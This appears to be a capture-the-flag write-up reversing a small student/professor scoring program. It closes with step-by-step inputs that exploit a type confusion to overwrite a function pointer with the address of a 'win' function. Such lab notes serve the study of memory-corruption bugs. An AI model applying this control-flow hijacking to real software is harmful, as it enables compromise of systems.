maybe you can use the function giveScoreToProfessor() to set the value stored in the student pointer.


int main(int argc, char **argv):

loops for a given global variable called ADRESSES_TAKEN, compared with 0x3e6 == 998

while ADDRESSES_TAKEN <= 998
{
	puts("Input the name of a student");
	pointer_student_struct = malloc(0x84);
	ADDRESSES[ADDRESSES_TAKEN] = pointer_student_struct;
	readLIne(&(pointer_student_struct->name));

	puts("Input the name of the favorite proffessor")
	pointer_prof_struct = malloc(0x84);
	ADDRESSES[ADDRESSES_TAKEN+1] = pointer_prof_struct;
	readLine(&(pointer_prof_struct->name));

	pointer_student_struct->func = &giveScoreToProfessor;
	ADDRESSES_TAKEN += 2;

	puts("Input the name of the student that will");
	readLine(var_10);

	pointer_student_struct = retrieveStudent(&var_10);

	puts("Input the name of the professor that will");
	readLine(var_8c);

	pointer_prof_struct = retrieveProfessor(&var_8c);

	puts(pointer_prof_struct->name);
	puts("Input the score: ")
	scanf("%u", &var_118);

	pointer_student_struct->func(pointer_prof_struct, var_118);

void readLine(void *buffer):
Reads 0x7f bytes from stdin, and stores it in the given buffer.
Then null-terminates the string stored in the buffer.

void * retrieveProfessor(char *name):
	* should return a struct, based on name.
	* should in theory return a student struct if its name is the name searched.

program use order:
1. insert student named "a"
2. insert professor named "b"
3. choose "a" to give score.
4. choose "a" as professor to get grade.
5. give address in decimal of win as grade. (0x08048696 == 134514326)
6. insert student named "c"
7. insert professor named "d"
8. choose "a" to give score.
9. choose "b" as professor to get grade.
10. give random value.
